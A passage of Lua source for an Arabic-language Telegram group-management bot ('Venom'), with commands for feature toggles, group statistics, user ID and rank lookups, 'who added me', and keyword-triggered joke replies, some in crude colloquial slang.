database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, anemi)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,photo_caption)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end

-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فينوم').." غادر" or text == 'غادر' then  
if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,'※ تم مغادرة المجموعه') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
if text == 'الاحصائيات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' 𖥔 الاحصائيات  \n'..' 𖥔 عدد الجروبات  ↚ {'..Groups..'}'..'\n 𖥔  عدد المشتركين  ↚ {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'الجروبات' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' 𖥔 عدد الجروبات  ↚ {`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'المشتركين' then
if Sudo(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = ' 𖥔 عدد المشتركين  ↚ {`'..Users..'|}'
send(msg.chat_id_, msg.id_,Text) 
end
return false
end
if text == 'تفعيل المغادره' and Devban(msg) then   
if database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and Devban(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = ' 𖥔 تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = ' 𖥔 بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end

if text == 'تفعيل الردود العامه' and Manager(msg) then   
if database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:del(bot_id..'Reply:Sudo'..msg.chat_id_)  
Text = '\n 𖥔 تم تفعيل الردود العامه' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الردود العامه' and Manager(msg) then  
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
database:set(bot_id..'Reply:Sudo'..msg.chat_id_,true)   
Text = '\n 𖥔 تم تعطيل الردود العامه' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الايدي' and Manager(msg) then   
if database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id'..msg.chat_id_) 
Text = '\n 𖥔 تم تفعيل الايدي' 
else
Text = '\n 𖥔  بالتاكيد تم تفعيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الايدي' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id'..msg.chat_id_,true) 
Text = '\n 𖥔 تم تعطيل الايدي' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل الايدي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل ايدي صوره' and Manager(msg) then   
if database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:del(bot_id..'Bot:Id:Photo'..msg.chat_id_) 
Text = '\n 𖥔 تم تفعيل الايدي بالصور' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ايدي صوره' and Manager(msg) then  
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_)  then
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true) 
Text = '\n 𖥔 تم تعطيل الايدي بالصوره' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الحظر' and Constructor(msg) then   
if database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:del(bot_id..'Lock:kick'..msg.chat_id_) 
Text = '\n 𖥔 تم تفعيل الحظر' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الحظر' and Constructor(msg) then  
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
database:set(bot_id..'Lock:kick'..msg.chat_id_,true) 
Text = '\n 𖥔 تم تعطيل الحظر' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل الحظر'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل الرفع' and Constructor(msg) then   
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:del(bot_id..'Lock:Add:Bot'..msg.chat_id_) 
Text = '\n 𖥔 تم تفعيل الرفع' 
else
Text = '\n 𖥔 بالتاكيد تم تفعيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل الرفع' and Constructor(msg) then  
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
database:set(bot_id..'Lock:Add:Bot'..msg.chat_id_,true) 
Text = '\n 𖥔 تم تعطيل الرفع' 
else
Text = '\n 𖥔 بالتاكيد تم تعطيل الرفع'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ايدي' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.sender_user_id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.sender_user_id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.sender_user_id_) or 0)
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,' 𖥔 ايديه ⇜ '..iduser..'\n 𖥔 معرفه ⇜ 「'..username..'」\n 𖥔 رتبته ⇜ '..rtp..'\n 𖥔 تعديلاته ⇜ '..edit..'\n 𖥔 نقاطه ⇜ '..NUMPGAME..'\n 𖥔 جهاته ⇜ '..Contact..'\n 𖥔 رسائله ⇜ 「'..Msguser..'」')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^ايدي @(.*)$") then
local username = text:match("^ايدي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..result.id_) or 1) 
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..result.id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..result.id_) or 0)
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..result.id_) or 0)
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' 𖥔 ايديه ⇜「'..iduser..'」\n 𖥔 معرفه ⇜「'..username..'」\n 𖥔 رتبته ⇜「'..rtp..'」\n 𖥔 تعديلاته ⇜('..edit..')\n 𖥔 نقاطه ⇜('..NUMPGAME..')\n 𖥔 جهاته ⇜('..Contact..')\n 𖥔 رسائله ⇜(「'..Msguser..'」)')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖥔 المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end


if text == 'رتبتي' then
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,' رتبتك 𖥔 「 '..rtp..' 」 \n    √') 
end

if text == 'انا مين' then 
local my_ph = database:get(bot_id.."my_anamen:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖥔انا مين معطله") 
return false  
end
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_) 
send(msg.chat_id_, msg.id_,' انت 「 '..rtp..' 」 روح قلبي 🥺❤️\n  ⋆') 
end
if text == "تفعيل ردود السورس"  then
if Constructor(msg) then  
database:set(bot_id.."my_GHoeq2:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖥔تـم تـفعـيل ردود السورس") 
return false  
end
end
if text == "تعطيل ردود السورس"  then
if Constructor(msg) then  
database:del(bot_id.."my_GHoeq2:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖥔 تـم تـعـطـيل ردود السورس") 
return false end
end

if text == 'تيست' then 
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, ' البوت شغال ') 
return false
end


if text == 'سلام' then 
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ") 
return false  
end
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/SOURCEVENOM)')
return false
end

if text == 'هاي' or text == 'هيي' then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖥔معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/SOURCEVENOM)')
return false
end

if text then 
list = {'برايفت'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'النبي'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'قفل المحن'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'اهلا عزيزي تم قفل المحن بنجاح اتمحونوا بف عشان المراره 😹??') 
return false
end
end
end

if text then 
list = {'🙄'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..🌚♥️](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'فتح المحن'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, 'اهلا عزيزي تم فتح المحن بنجاح') 
return false
end
end
end
if text == "حلوه"  or text == "حلو" then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/SOURCEVENOM)')
return false
end

if text then 
list = {'💋'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'بف'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'😭'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'خاص'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'بحبك'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/SOURCEVENOM)')
return false
end
end
end

if text then 
list = {'بيف'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'سلام عليكم'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'++٩٠'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'قامد'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'جامد'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[انا اجمد ..🌚💕](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'جمد'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[انا اجمد ..??💕](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'تيجي'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'مش'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[مش بدودو ..😹👻](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'بنتي'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'ابني'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'😂'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💕](t.me/SOURCEVENOM)')
return false
end
end
end
if text then 
list = {'😹'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_,"  ") 
return false  
end
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚💕](t.me/SOURCEVENOM)')
return false
end
end
end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = ' 𖥔 اسمك الاول  ↚ {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = ' 𖥔 اسمك الثاني  ↚ {`'..result.last_name_..'`}' 
else
last_name = ''
end      
send(msg.chat_id_, msg.id_,first_name..'\n'..last_name) 
end,nil)
end 
if text == 'بايو' then   
send(msg.chat_id_, msg.id_,getbio(msg.sender_user_id_)) 
end 
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,' 𖥔 ايديك  ↚ '..msg.sender_user_id_)
end
if text == 'الرتبه' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'*- الـعـضو  ↭ 「*'..username..'*」\n- الرتبه ↭ 「'..rtp..'」*\n')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^الرتبه @(.*)$") then
local username = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'*- الـعـضو  ↭ 「*'..username..'*」\n- الرتبه ↭ 「'..rtp..'」*\n')
end,nil)
else
send(msg.chat_id_, msg.id_,'- المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text and text:match("^الرتبه @(.*)$") then
local userid = text:match("^الرتبه @(.*)$")
function start_function(extra, result, success) 
if userid then 
tdcli_function ({ID = "GetUser",user_id_ = userid},function(extra,data)  
local rtp = Rutba(userid,msg.chat_id_) 
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = userid 
send(msg.chat_id_, msg.id_,'*- الـعـضو  ↭ 「*'..username..'*」\n- الرتبه ↭ 「'..rtp..'」*\n')
end,nil) 
else 
send(msg.chat_id_, msg.id_,' ✧الايدي غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'✧الايدي ↭ 「'..iduser..'」\n✧المعرف ↭ 「'..username..'」\n✧الرتبه ↭ 「'..rtp..'」\n✧نوع الكشف ↭ بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
---------
if text and text:match("^كشف @(.*)$") then
local username = text:match("^كشف @(.*)$")
function start_function(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(extra,data) 
local rtp = Rutba(result.id_,msg.chat_id_)
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,'✧الايدي ↭ 「'..iduser..'」\n✧المعرف ↭ 「'..username..'」\n✧الرتبه ↭ 「'..rtp..'」\n✧نوع الكشف ↭ بالمعرف')
end,nil)
else
send(msg.chat_id_, msg.id_,'✧المعرف غير صحيح')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
if text and text:match("^كشف (.*)$") then 
local userid = text:match("^كشف (.*)$") 
function start_function(extra, result, success) 
if userid then 
tdcli_function ({ID = "GetUser",user_id_ = userid},function(extra,data)  
local rtp = Rutba(userid,msg.chat_id_) 
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = userid 
send(msg.chat_id_, msg.id_,'✧الايدي ↭ 「'..iduser..'」\n✧المعرف ↭ 「'..username..'」\n✧الرتبه ↭ 「'..rtp..'」\n✧نوع الكشف↭ الايدي')
end,nil) 
else 
send(msg.chat_id_, msg.id_,' ✧الايدي غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text==('معلومات الجروب') and Mod(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_," 𖥔 البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local ban = ' 𖥔 عدد الادمنيه : '..data.administrator_count_..
'\n\n 𖥔 عدد المطرودين : '..data.kicked_count_..
'\n\n 𖥔 عدد الاعضاء : '..data.member_count_..
'\n\n 𖥔 عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n 𖥔  اسم الجروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, ban) 
end,nil)
end,nil)
end 
if text == 'اطردني' or text == 'طردني' and GetChannelMember(msg) then   
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Can_or_NotCan(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n 𖥔عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
local Text = "قم بتأكيد العمليه الان"
keyboard = {} 
keyboard.inline_keyboard = {
{{text="تأكيد الامر",callback_data="OkKikedMe"..msg.sender_user_id_},{text="الغاء الامر",callback_data="noKikedMe"..msg.sender_user_id_}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if text and text:match("^صيح (.*)$") then
local username = text:match("^صيح (.*)$") 
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
function start_function(extra, result, success)
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_,' 𖥔 المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,' 𖥔 لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,' 𖥔 لا استطيع اصيح معرف بوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⚠| لا اسطيع صيح معرفات الجروبات') 
return false  
end
if result.id_ then
send(msg.chat_id_, msg.id_,' 𖥔 😾تع يعم كلم الود دا قرفني [@「'..username..'」]') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
else
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل امر صيح') 
end
return false
end

if string.find(text,"ضافني") or string.find(text,"ضفني") then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,' 𖥔 انت منشئ الجروب') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖥔 هوا ابن القمر دا الي ضافك😹 ↚ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖥔 انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل امر  مين ضافني') 
end
end
if text == 'مين ضافني هنا' then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,' 𖥔 انت منشئ الجروب') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖥔 هوا ابن الكلب دا الي ضافك😹 ↚ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖥔 انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل امر  مين ضافني') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل امر مين ضافني '
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل ضافني' and Manager(msg) then  
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
database:set(bot_id..'Added:Me'..msg.chat_id_,true)  
